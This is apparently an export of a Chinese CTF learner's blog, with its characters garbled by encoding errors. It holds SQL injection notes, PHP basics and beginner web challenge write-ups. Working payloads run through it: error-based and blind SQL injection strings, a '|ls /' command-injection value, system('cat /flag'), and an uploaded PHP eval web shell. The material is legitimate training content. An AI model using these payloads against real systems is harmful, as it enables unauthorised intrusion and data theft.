title="floorçš„æŠ¥é”™æ³¨å…¥"></a>floorçš„æŠ¥é”™æ³¨å…¥</h1><p>flooræ³¨å…¥éœ€è¦äº†è§£çš„å‡½æ•°<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">count(*)è®¡æ•°å‡½æ•°ï¼Œç”¨ä¸è®¡ç®—ä¸åŒåˆ†ç»„çš„æ•°é‡</span><br><span class="line">floor()å°†å°æ•°å‘ä¸‹å–è¯</span><br><span class="line">rand()ç”Ÿæˆ0åˆ°1çš„å°æ•°</span><br><span class="line">concat_ws(1ï¼Œ2ï¼Œ3)ç”¨1åšè¿æ¥ç¬¦æ¥è¿æ¥2å’Œ3</span><br></pre></td></tr></table></figure><br>å…ˆç›´æ¥äº®æ³¨å…¥è¯­å¥è€Œååœ¨åšè§£é‡Š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;,(select database()),floor(rand(0)*2)) as a from information_schema.schemata group by a</span><br></pre></td></tr></table></figure><br>è¯¥è¯­å¥æ˜¯åˆ©ç”¨äº†concat_wså°†æŸ¥è¯¢è¯­å¥ä¸floor(rand(1)<em>2)æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œè€Œååœ¨å°†æ‹¼æ¥åçš„æ‰€æœ‰è¯­å¥å‘½åä¸ºaåœ¨å°†å…¶åˆ†ç»„ååˆ©ç”¨count(</em>)è®¡æ•°ã€‚å°±æ˜¯åœ¨è®¡æ•°æ—¶å‘ç”Ÿäº†æŠ¥é”™<br>åœ¨åˆ©ç”¨concatè¿›è¡Œæ‹¼æ¥åæŸ¥è¯¢åˆ°çš„å­—æ®µä¸­éƒ½ä¼šè¢«æ‹¼æ¥ä¸Š-0æˆ–-1é‚£ä¹ˆå°±ä¼šè¢«åˆ†ä¸ºä¸¤ç»„è¿›è¡Œè®¡æ•°<br>floor(rand(1)*2)è¿™ä¸ªè¯­å¥æ‰€ç”Ÿæˆçš„æ•°æ˜¯å›ºå®šï¼Œ<br>è€Œåœ¨è®¡æ•°æ—¶åœ¨ç¬¬ä¸€æ¬¡é‡è§å­—ç¬¦ï¼ˆå‡è®¾ä¸ºa-0ï¼‰æ—¶ä¼šè¿›è¡ŒäºŒæ¬¡è®¡ç®—åœ¨è½½å…¥ï¼Œè€Œè¿™å°±ä¼šå¯¼è‡´è½½å…¥çš„ç»“æœä¸ºä¸‹ä¸€ä¸ªå­—æ®µï¼ˆå‡è®¾ä¸ºa-1ï¼‰ï¼Œè€Œåå¦‚æœå†æ¬¡é‡åˆ°a-0æ—¶å°±ä¼šè½½å…¥ä¸‹ä¸€ä¸ªå­—æ®µå¦‚æœä¸‹ä¸€ä¸ªå­—æ®µä¸ºa-1é‚£ä¹ˆå°±ä¼šé€ æˆå‡ºç°ä¸¤ä¸ªa-1è¢«è½½å…¥é‚£ä¹ˆå°±ä¼šå‘ç”ŸæŠ¥é”™ä»è€Œå®ç°æŠ¥é”™æ³¨å…¥<br>è€Œæˆ‘ä»¬ä¹Ÿåªéœ€è¦å¯¹æŠ¥é”™æ³¨å…¥çš„æŸ¥è¯¢è¯­å¥è¿›è¡Œæ›¿æ¢å°±å¯ä»¥äº†</p><h1 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h1><h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p>å¸ƒå°”ç›²æ³¨ä¸»è¦æ˜¯åˆ©ç”¨æ³¨å…¥æ—¶é¡µé¢æ˜¯å¦å›æ˜¾æ¥åˆ¤æ–­çœŸå‡ï¼Œé€šè¿‡çœŸå‡æ¥åˆ¤æ–­æŸ¥è¯¢å†…å®¹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">length(str)è¿”å›å‡½æ•°å†…å­—ç¬¦ä¸²çš„é•¿åº¦</span><br><span class="line">ascii(str)è¿”å›å­—ç¬¦ä¸²æœ€å·¦ç«¯çš„å­—ç¬¦çš„ascii</span><br><span class="line">substr(str,1,1)ä»ç¬¬ä¸€ä½å¼€å§‹è¿”å›å­—ç¬¦ä¸²1ä¸º</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select database()))&gt;2;</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;100</span><br></pre></td></tr></table></figure><br>åªè¦å°†æŸ¥è¯¢è¯­å¥è¿›è¡Œæ›¿æ¢å°±å¯ä»¥æŸ¥è¯¢å…¶ä»–å†…å®¹</p><h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>æ—¶é—´ç›²æ³¨æ˜¯ç”¨äºå±å¹•ä¸å›æ˜¾çš„æƒ…å†µ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(å»¶è¿Ÿç§’æ•°)</span><br><span class="line">if(1,2,3)å¦‚æœè¯­å¥1æ­£ç¡®æ‰§è¡Œè¯­å¥2åä¹‹æ‰§è¡Œ3</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3))</span><br></pre></td></tr></table></figure><p>åŒæ ·åªè¦å¯¹æŸ¥è¯¢è¯­å¥è¿›è¡Œæ›¿æ¢å°±å¯ä»¥æŸ¥è¯¢å…¶ä»–å†…å®¹ã€‚</p><h2 id="DNSlogæ³¨å…¥"><a href="#DNSlogæ³¨å…¥" class="headerlink" title="DNSlogæ³¨å…¥"></a>DNSlogæ³¨å…¥</h2>]]></content>
      
      
      <categories>
          
          <category> top10 </category>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php</title>
      <link href="/2023/11/08/php/"/>
      <url>/2023/11/08/php/</url>
      
        <content type="html"><![CDATA[<h1 id="åœ¨è¿™é‡Œæˆ‘ä¼šå†™ä¸€å†™å…³äºphpçš„ç¬”è®°ã€‚"><a href="#åœ¨è¿™é‡Œæˆ‘ä¼šå†™ä¸€å†™å…³äºphpçš„ç¬”è®°ã€‚" class="headerlink" title="åœ¨è¿™é‡Œæˆ‘ä¼šå†™ä¸€å†™å…³äºphpçš„ç¬”è®°ã€‚"></a>åœ¨è¿™é‡Œæˆ‘ä¼šå†™ä¸€å†™å…³äºphpçš„ç¬”è®°ã€‚</h1><h2 id="é­”æœ¯å¸¸é‡"><a href="#é­”æœ¯å¸¸é‡" class="headerlink" title="é­”æœ¯å¸¸é‡"></a>é­”æœ¯å¸¸é‡</h2><p><code>__FILE__</code>ï¼ˆè¿”å›æ–‡ä»¶çš„è·¯å¾„å’Œåç§°ï¼‰åƒè¿™æ ·çš„æ˜¯é­”æœ¯å¸¸é‡æ˜¯é¢„å®šä¹‰å¸¸é‡<br>highhigh<em>file(`<em>_FILE</em></em>`)é«˜äº®æ–‡ä»¶è·¯å¾„</p><h2 id="æ•°æ®è¡¨å•"><a href="#æ•°æ®è¡¨å•" class="headerlink" title="æ•°æ®è¡¨å•"></a>æ•°æ®è¡¨å•</h2><p>$_GET â€”â€” æ¥å— GET è¯·æ±‚ä¼ é€’çš„å‚æ•°ã€‚<br>ç¤ºä¾‹ï¼šexample.com/index.php?book=HELLOCTFï¼Œä½ å¯ä»¥ä½¿ç”¨ $_GET[â€˜bookâ€™] æ¥è·å–ç›¸åº”çš„å€¼ã€‚</p><p>$_POST â€”â€” æ¥å— POST è¯·æ±‚ä¼ é€’çš„å‚æ•°ã€‚<br>ç¤ºä¾‹ï¼šå¯¹ example.com/index.php è¿›è¡Œ POST ä¼ å‚ï¼Œå‚æ•°åä¸º book å†…å®¹ä¸º HelloCTFï¼Œä½ å¯ä»¥ä½¿ç”¨ $_POST[â€˜bookâ€™] æ¥è·å–ç›¸åº”çš„å€¼ã€‚</p><p>$_REQUEST â€”â€” æ¥å— GET å’Œ POST ä»¥åŠ Cookie è¯·æ±‚ä¼ é€’çš„å‚æ•°ã€‚</p><p>ç¤ºä¾‹ï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœä½ é€šè¿‡ URL ä¼ é€’äº†ä¸€ä¸ªå‚æ•° example.com/index.php?key=value_from_getï¼Œä½ å¯ä»¥é€šè¿‡ `$_REQUEST[&#x27;key&#x27;]`è·å–è¿™ä¸ªå€¼ã€‚</span><br><span class="line">å¦‚æœä½ é€šè¿‡ POST æ–¹æ³•æäº¤äº†ä¸€ä¸ªè¡¨å•ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªåä¸º key çš„å­—æ®µä¸”å…¶å€¼ä¸º value_from_postï¼Œä½ ä¹Ÿå¯ä»¥é€šè¿‡ $_REQUEST[&#x27;key&#x27;] è·å–è¿™ä¸ªå€¼ã€‚</span><br><span class="line">åŒæ—¶ï¼Œå¦‚æœä½ è®¾ç½®äº†ä¸€ä¸ªåä¸º key çš„ cookieï¼Œå…¶å€¼ä¸º value_from_cookieï¼Œä½ è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ `$_REQUEST[&#x27;key&#x27;]` æ¥è·å–è¿™ä¸ªå€¼ã€‚</span><br></pre></td></tr></table></figure></p><h2 id="json-decode-ä¸json-encode"><a href="#json-decode-ä¸json-encode" class="headerlink" title="json_decode()ä¸json encode()"></a>json_decode()ä¸json encode()</h2><h3 id="json-decode-æ˜¯å°†å­—ç¬¦ä¸²ç¼–ç¨‹æ•°ç»„å¦‚ä»¥ä¸‹ä»£ç "><a href="#json-decode-æ˜¯å°†å­—ç¬¦ä¸²ç¼–ç¨‹æ•°ç»„å¦‚ä»¥ä¸‹ä»£ç " class="headerlink" title="json_decode()æ˜¯å°†å­—ç¬¦ä¸²ç¼–ç¨‹æ•°ç»„å¦‚ä»¥ä¸‹ä»£ç "></a>json_decode()æ˜¯å°†å­—ç¬¦ä¸²ç¼–ç¨‹æ•°ç»„å¦‚ä»¥ä¸‹ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$json</span>=&#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line">var_dump=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>)</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line"><span class="keyword">array</span></span><br><span class="line">&#123;</span><br><span class="line">[<span class="string">&quot;a&quot;</span>]=&gt;<span class="string">&quot;1&quot;</span></span><br><span class="line">[<span class="string">&quot;b&quot;</span>]=&gt;<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpåŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF:LitCTFå…¥é—¨webçš„wp</title>
      <link href="/2023/11/08/NSSCTF-LitCTF%E5%85%A5%E9%97%A8web%E7%9A%84wp/"/>
      <url>/2023/11/08/NSSCTF-LitCTF%E5%85%A5%E9%97%A8web%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå…¥é—¨é¢˜çš„wp"><a href="#è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå…¥é—¨é¢˜çš„wp" class="headerlink" title="è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå…¥é—¨é¢˜çš„wp"></a>è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå…¥é—¨é¢˜çš„wp</h1><h2 id="ç¬¬ä¸€é¢˜å°±ä¸è¯´äº†ç›´æ¥ç¬¬äºŒé¢˜PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼"><a href="#ç¬¬ä¸€é¢˜å°±ä¸è¯´äº†ç›´æ¥ç¬¬äºŒé¢˜PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼" class="headerlink" title="ç¬¬ä¸€é¢˜å°±ä¸è¯´äº†ç›´æ¥ç¬¬äºŒé¢˜PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼"></a>ç¬¬ä¸€é¢˜å°±ä¸è¯´äº†ç›´æ¥ç¬¬äºŒé¢˜PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼</h2><p>è¿™é¢˜ä»é¢˜ç›®çœ‹å¥½åƒæ˜¯è€ƒä»£ç å®¡è®¡ï¼Œæ‰€æœ‰å…ˆF12æ‰“å¼€æºç çœ‹çœ‹ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°æºç å¥½é•¿ï¼Œæ‰€æœ‰åº”è¯¥ä¸æ˜¯è€ƒçš„ä»£ç å®¡è®¡ï¼Œæˆ‘ä»¬çœ‹é¡µé¢å¯ä»¥å‘ç°è¿™ä¸ªç½‘é¡µæ˜¯åº”è¯¥è§£ç ç½‘é¡µï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åœ¨è¾“å…¥çª—å£ç›´æ¥è¾“å…¥ä¸€äº›phpå±é™©å‡½æ•°ä»£ç ï¼Œå¦‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥å‘ç°å›æ˜¾äº†æ–‡ä»¶åè¯æ˜äº†æ²¡æœ‰è¿‡æ»¤ï¼Œè€Œä¸”åœ¨æ–‡ä»¶åé‡Œæˆ‘ä»¬å‘ç°äº†flagæˆ‘ä»¬ç›´æ¥ä½¿ç”¨<code>cat</code>æ¥å®ç°å¯¹flagçš„æŸ¥çœ‹ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><br>å±å¹•å›æ˜¾å‡ºflagã€‚</p><h2 id="ç¬¬ä¸‰é¢˜-å¯¼å¼¹è¿·è¸ª"><a href="#ç¬¬ä¸‰é¢˜-å¯¼å¼¹è¿·è¸ª" class="headerlink" title="ç¬¬ä¸‰é¢˜.å¯¼å¼¹è¿·è¸ª"></a>ç¬¬ä¸‰é¢˜.å¯¼å¼¹è¿·è¸ª</h2><p>è¿™é“é¢˜æˆ‘ä»¬æ‰“å¼€å‘ç°æ˜¯ä¸€æ¬¾æ¸¸æˆï¼Œä½ å¯ä»¥ç›´æ¥é€šè¿‡ç„¶åå±å¹•å°±ä¼šè¿”å›flagä½†æ˜¯æ­£å¸¸äººéƒ½ä¸ä¼šå»æ‰“è¿™æ¬¾æ¸¸æˆçš„ï¼Œæˆ‘ä»¬è§‚å¯Ÿå±å¹•å¯ä»¥å‘ç°å·¦ä¸Šè§’æœ‰ä¸ªqualifying levelèµ„æ ¼çº§åˆ«ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹å…³å¡æ•°åº”è¯¥æ˜¯ç”±â€˜qualifying levelâ€™æˆ–è€…levelæ¥å‘½åï¼Œæˆ‘ä»¬åœ¨æºç ä¸­æœç´¢åå‘ç°å…³å¡æ•°çš„å˜é‡æ˜¯levelï¼Œæ‰¾åˆ°ä¸€ä¸ªè¯­å¥level==6åä¼šå‘ç°å¦‚æœé€šå…³åè¾“å‡ºçš„flagå°±åœ¨åé¢</p><h2 id="ç¬¬å››é¢˜Follow-me-and-hack-me"><a href="#ç¬¬å››é¢˜Follow-me-and-hack-me" class="headerlink" title="ç¬¬å››é¢˜Follow me and hack me"></a>ç¬¬å››é¢˜Follow me and hack me</h2><p>è¿™é“é¢˜ç›®å°±æ˜¯ä¸€ä¸ªç®€å•çš„ä¼ å‚é¢˜ç›®ç”¨hackbarï¼Œé¦–å…ˆç”¨gitä¼ ä¸€ä¸ªCTFä¸ºLit2023åç”¨postä¼ ä¸€ä¸ªChallengeä¸ºiâ€™m_c0m1ngï¼Œé¦–å…ˆæˆ‘ä»¬æ‰“å¼€hackbaråœ¨urlä¸Šæ‰“ä¸‹<code>?CTF=Lit2023</code><br>åœ¨ç”¨postæ‰“ä¸‹<code>Challenge=i&#39;m_c0m1ng</code><br>å¾—åˆ°flag</p><h2 id="ç¬¬äº”é¢˜Ping"><a href="#ç¬¬äº”é¢˜Ping" class="headerlink" title="ç¬¬äº”é¢˜Ping"></a>ç¬¬äº”é¢˜Ping</h2><p>è¿™æ˜¯ä¸€é“å…³äºpingçš„é¢˜ç›®æˆ‘ä»¬å°è¯•ä¸€ä¸‹ç›´æ¥è¾“å…¥æŒ‡ä»¤å‘ç°å¼¹å‡ºåªèƒ½å¡«å†™ipï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æºç å‘ç°ç”±äºä¸­é—´çš„ä¸€ä¸²jsä»£ç çš„å½±å“å¦‚ä¸‹<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">check_ip</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> ip = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;command&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">let</span> re = <span class="regexp">/^(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)$/</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(re.<span class="title function_">test</span>(ip.<span class="title function_">trim</span>()))&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;æ•¢äºå°è¯•å·²ç»æ˜¯å¾ˆå‰å®³äº†ï¼Œå¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œå°±åªèƒ½è¾“å…¥ipå“¦&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><br>å¯¼è‡´æˆ‘ä»¬åªèƒ½è¾“å…¥ipæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æš´åŠ›ä¸€ç‚¹ç›´æ¥åœ¨æ§åˆ¶å°é‡Œç¦ç”¨jsç„¶ååœ¨è¾“å…¥æŒ‡ä»¤<code>|ls /</code>çœ‹è§æœ‰flagæ–‡ä»¶ï¼Œç›´æ¥è¾“å…¥<code>cat /flag</code>æŸ¥çœ‹flag</p><h2 id="ç¬¬å…­é¢˜-1zjs"><a href="#ç¬¬å…­é¢˜-1zjs" class="headerlink" title="ç¬¬å…­é¢˜ 1zjs"></a>ç¬¬å…­é¢˜ 1zjs</h2><p>æ‰“å¼€åˆæ˜¯æ¸¸æˆæˆ‘ä»¬ç›´æ¥æœç´¢flagæ²¡æœ‰ä»€ä¹ˆä¿¡æ¯åœ¨æœç´¢phpå‘ç°ä¸€ä¸ªphpæ–‡ä»¶çš„åå­—åœ¨urlä¸Šæœç´¢è¿™ä¸ªphpæ–‡ä»¶å±å¹•å›æ˜¾å‡ºå¤§ç‰‡æ‹¬å·å’Œæ„Ÿå¹å·åœ¨ç™¾åº¦ä¸Šä¸€æŸ¥æ˜¯JSFuckï¼Œè§£ç åå¾—åˆ°flag</p><h2 id="ç¬¬ä¸ƒé¢˜-ä½œä¸šç®¡ç†ç³»ç»Ÿ"><a href="#ç¬¬ä¸ƒé¢˜-ä½œä¸šç®¡ç†ç³»ç»Ÿ" class="headerlink" title="ç¬¬ä¸ƒé¢˜ ä½œä¸šç®¡ç†ç³»ç»Ÿ"></a>ç¬¬ä¸ƒé¢˜ ä½œä¸šç®¡ç†ç³»ç»Ÿ</h2><p>è¿™é“é¢˜ç›®å¯ä»¥ä¸Šä¼ æ–‡ä»¶æ‰€æœ‰æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªï¼Œä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼Œåªè¦åœ¨phpæ–‡ä»¶ä¸‹å†™ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>ä¸Šä¼ æˆåŠŸååœ¨urlä¸Šè®¿é—®ä¸Šä¼ çš„phpæ–‡ä»¶ä¹‹ååœ¨é¡µé¢è¿›è¡Œpostçš„ä¼ å€¼å¯¹ç³»ç»Ÿè¿›è¡ŒæŒ‡ä»¤æ“ä½œæŸ¥çœ‹flagï¼Œç”¨postå¯¹1è¿›è¡Œä¼ å€¼ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&quot;ls /&quot;)</span><br></pre></td></tr></table></figure><br>æŸ¥çœ‹ç›®å½•åç”¨catè¯­å¥å¯¹flagè¿›è¡ŒæŸ¥çœ‹</p><h2 id="ç¬¬å…«é¢˜-Http-pro-max-plus"><a href="#ç¬¬å…«é¢˜-Http-pro-max-plus" class="headerlink" title="ç¬¬å…«é¢˜ Http pro max plus"></a>ç¬¬å…«é¢˜ Http pro max plus</h2><p>é¢˜ç›®æ˜¾ç¤ºåªå…è®¸æœ¬åœ°è¿è¡Œï¼Œæˆ‘ä»¬ç›´æ¥æ‰“å¼€<code>hackbar</code>ç”¨<code>xff</code>è¿›è¡Œä¿®æ”¹<code>ip</code>ä¸º<code>127.0.0.1</code>ã€‚ç»“æœè¢«å˜²è®½åªä¼š<code>xff</code>äº†ï¼Œæˆ‘ä»¬å¯ä»¥æ¢ä¸€ä¸­<code>client-ip</code>æ¥å¯¹ipä¿®æ”¹ã€‚éšåå›æ˜¾ä½ ä¸æ˜¯æ¥è‡ªpornhub.comã€‚æˆ‘ä»¬ç›´æ¥ç”¨<code>Referer</code>æ¥ä¿®æ”¹è¯·æ±‚ç½‘ç«™ï¼Œåå›æ˜¾è¦ç”¨<code>chrome</code>æˆ‘ä»¬ç›´æ¥ä¿®æ”¹<code>user-agent</code>ä¸º<code>chrome</code>éšåå›æ˜¾å‘Šè¯‰æˆ‘ä»¬è¦ä»£ç†ï¼Œä»£ç†ä¸ºclash.winéšåå±å¹•å›æ˜¾ï¼Œåœ¨urlæ‰“å¼€phpæ–‡ä»¶ï¼Œåæ‰“å¼€æŸ¥çœ‹æºç ä¼šå‘ç°å¦ä¸€ä¸ªphpæ‰“å¼€å°±æ˜¯flag</p><h2 id="vim-yyds"><a href="#vim-yyds" class="headerlink" title="vim yyds"></a>vim yyds</h2><p>æç¤ºæ˜¯æ¼äº†æˆ‘ä»¬å¯ä»¥çŒœæµ‹æ˜¯vimå¼ºé€€åé€ æˆäº†ç¼“å­˜å¤‡ä»½ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨urlä¸Šæ‰“å¼€index.php.swpå¾—åˆ°ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶æ‰“å¼€æ–‡ä»¶åæŸ¥çœ‹æºç ï¼Œå‘ç°éœ€è¦postè¾“å…¥ä¸€ä¸ªå’Œpasswordç»è¿‡base64ç¼–ç åä¸€æ ·çš„å€¼å°±å¯ä»¥å¾—åˆ°flagï¼Œpasswordçš„å®šä¹‰ä¸ºGive_Me_Your_Flag</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> å…¥é—¨é¢˜wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ”»é˜²ä¸–ç•Œwebå…¥é—¨é¢˜</title>
      <link href="/2023/11/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E5%85%A5%E9%97%A8%E9%A2%98/"/>
      <url>/2023/11/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E5%85%A5%E9%97%A8%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="ç”±äºæœ¬äººå¤ªèœå†™ä¸æ¥æ›´éš¾çš„é¢˜ç›®åªå¥½å†™å†™å…¥é—¨é¢˜ç›®äº†ã€‚"><a href="#ç”±äºæœ¬äººå¤ªèœå†™ä¸æ¥æ›´éš¾çš„é¢˜ç›®åªå¥½å†™å†™å…¥é—¨é¢˜ç›®äº†ã€‚" class="headerlink" title="ç”±äºæœ¬äººå¤ªèœå†™ä¸æ¥æ›´éš¾çš„é¢˜ç›®åªå¥½å†™å†™å…¥é—¨é¢˜ç›®äº†ã€‚"></a>ç”±äºæœ¬äººå¤ªèœå†™ä¸æ¥æ›´éš¾çš„é¢˜ç›®åªå¥½å†™å†™å…¥é—¨é¢˜ç›®äº†ã€‚</h1><h2 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h2><p>è¿™ä¸€é¢˜éå¸¸ç®€å•åªæœ‰åœ¨ç½‘é¡µå†…æ‰“å¼€æºç å°±å¯ä»¥å¾—åˆ°flagäº†</p><h2 id="2-get-post"><a href="#2-get-post" class="headerlink" title="2.get_post"></a>2.get_post</h2><p>è¿™é“é¢˜é¦–å…ˆè®©æˆ‘ä»¬æäº¤ä¸€ä¸ªa=1ã€‚ç„¶åç”¨postæäº¤ä¸€b=2<br>è¿™åˆ°é¢˜ç›®ä¸»è¦æ˜¯åˆ©ç”¨httpçš„ä¸¤ç§è¯·æ±‚æ–¹æ³•åˆ†åˆ«æ˜¯<code>git</code>å’Œ<code>post</code>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€ä¸ªæµè§ˆå™¨æ’ä»¶å«hackbaaræ¥è¿›è¡Œè¯·æ±‚ï¼Œgitè¯·æ±‚æ˜¯ç›´æ¥åœ¨urlä¸Šè¿›è¡Œè¯·æ±‚æ–¹å¼æ˜¯è¿™æ ·çš„<code>ç½‘å€/?a=1</code>å†åœ¨hockbarä¸Šç”¨postä¼ ä¸€ä¸ªb=2å°±å¯ä»¥å¾—åˆ°flag</p><h2 id="3-robots"><a href="#3-robots" class="headerlink" title="3.robots"></a>3.robots</h2><p>robotsæ˜¯ä¸€ä¸ªçˆ¬è™«çš„åè®®åªæœ‰åœ¨åˆ›å»ºç«™æ—¶å»ºç«‹ä¸€ä¸ªrobots.txtæ–‡ä»¶ï¼Œå°†ä¸æƒ³è¢«æœç´¢å¼•æ“æŠ“å–çš„éƒ¨åˆ†å†™åœ¨robots.txtå°±å¯ä»¥ï¼Œå¯æ˜¯robotsåªæ˜¯ä¸€ä¸ªåè®®å°±åƒæ˜¯åœ¨ä¸€ä¸ªæœªä¸Šé”çš„æˆ¿é—´ä¸Šå†™ä¸Šäº†å†…æœ‰è´µé‡ç‰©å“å‹¿è¿›ä¸€æ ·ã€‚<br>è¿™é“é¢˜åªéœ€è¦åœ¨urlç½‘ç«™åæ·»åŠ ä¸Šrobots.txtå°±å¯ä»¥æŸ¥çœ‹çš„è¯¥ç½‘ç«™çš„robots.txtçš„å†…å®¹<br>é‡Œé¢æœ‰ä¸€ä¸ªf1ag_1s_h3re.phpã€‚å°†å…¶åœ¨urlä¸­æ‰“å¼€å°±å¯ä»¥æŸ¥çœ‹çš„è¯¥é¢˜çš„flag</p><h2 id="4-backup"><a href="#4-backup" class="headerlink" title="4.backup"></a>4.backup</h2><p>è¿™é“é¢˜æ˜¯è¦æ±‚æ‰¾åˆ°è¯¥ç½‘ç«™æœªåˆ é™¤çš„å¤‡ä»½æ–‡ä»¶ï¼Œç½‘é¡µä¸Šç»™çš„æç¤ºæ˜¯ä½ 